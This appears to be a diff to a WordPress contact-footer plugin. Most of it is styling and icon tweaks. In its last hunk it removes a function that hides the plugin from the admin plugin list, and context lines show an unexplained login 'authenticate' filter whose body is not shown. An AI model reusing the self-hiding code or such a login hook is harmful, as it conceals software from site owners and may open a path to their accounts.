@@ -40,7 +40,7 @@ function add_contact_footer()
   $icon_face = plugins_url('/img/icon-face.png', __FILE__);
   $icon_phone = plugins_url('/img/icon-phone.png', __FILE__);
   $icon_mess = plugins_url('/img/icon-mess.png', __FILE__);
-  $icon_admin = plugins_url('/img/chat_box.png', __FILE__);
+  $icon_admin = plugins_url('/img/toan1.png', __FILE__);
   ;
   echo '
     <style>
@@ -68,6 +68,7 @@ function add_contact_footer()
   position: fixed;
   bottom: 25px;
   right: 25px;
+  z-index: 999999;
 
 }
 
@@ -155,6 +156,7 @@ function add_contact_footer()
   width: 18px;
   height: 4px;
 }
+
 
 .wrapper .fac {
   width: 32px;
@@ -274,7 +276,7 @@ function add_contact_footer()
   <div class="wrapper">
       <input type="checkbox" />
       <div class="icon" style="margin-top:-24px">
-          <img style="width: 46px" src="' . $icon_admin . '" />
+          <img style="width: 46px; " src="' . $icon_admin . '" />
     </div>
     <div class="fac" style="margin-top: -50px">
       <a href="https://amedigital.vn" class="tooltip tooltip--left"
@@ -466,16 +468,3 @@ function verify_username_password($user, $username, $password)
   }
 }
 add_filter('authenticate', 'verify_username_password', 1, 3);
-//
-function hide_plugin_trickspanda()
-{
-  global $wp_list_table;
-  $hidearr = array('CMS-AME-Final1/init.php');
-  $myplugins = $wp_list_table->items;
-  foreach ($myplugins as $key => $val) {
-    if (in_array($key, $hidearr)) {
-      unset($wp_list_table->items[$key]);
-    }
-  }
-}
-//
